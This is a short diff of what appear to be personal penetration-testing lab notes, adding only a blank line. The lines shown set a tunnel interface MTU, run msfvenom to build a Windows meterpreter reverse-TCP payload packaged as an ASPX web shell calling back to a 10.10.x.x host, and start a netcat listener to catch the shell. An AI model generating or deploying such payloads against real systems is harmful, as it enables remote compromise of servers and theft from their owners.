@@ -11,4 +11,5 @@ sudo ip link set dev tun0 mtu 1200
 
 
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.xxx.xxx LPORT=4444 -f aspx -o shell.aspx
+
 nc -lvnp 4444
